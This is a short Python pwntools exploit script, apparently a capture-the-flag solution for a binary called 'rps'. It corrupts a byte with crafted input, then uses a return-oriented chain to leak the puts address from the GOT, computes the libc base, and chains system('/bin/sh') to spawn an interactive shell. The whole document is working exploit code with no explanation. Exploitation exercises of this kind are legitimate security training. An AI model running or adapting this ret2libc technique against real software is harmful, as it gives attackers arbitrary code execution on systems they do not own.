from pwn import *

p = process('rps')
e = ELF('rps')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

rps = 0x401313
pop_rdi = 0x401513
ret = 0x40101a

def play_game(i, s):
    p.sendlineafter('> ', i)
    p.sendlineafter(': ', s)

p.sendlineafter(': ', 'y')

payload = b'yes\n\0' 
payload += b'A' * (0x19 - 6) 
payload += b'\x08'

play_game('1', payload)

payload = b'A' * (0xc + 0x8)
payload += pack(pop_rdi, 64)
payload += pack(e.got['puts'], 64)
payload += pack(e.plt['puts'], 64)
payload += pack(rps, 64)

play_game(payload, 'no')

libc.address = unpack(p.recvline()[:-1].ljust(8, b'\x00'), 64) - libc.symbols['puts']
print(hex(libc.address))

payload = b'A' * (0xc + 0x8)
payload += pack(ret, 64)
payload += pack(pop_rdi, 64)
payload += pack(next(libc.search(b'/bin/sh')), 64)
payload += pack(libc.symbols['system'], 64)

play_game(payload, 'no')

p.interactive()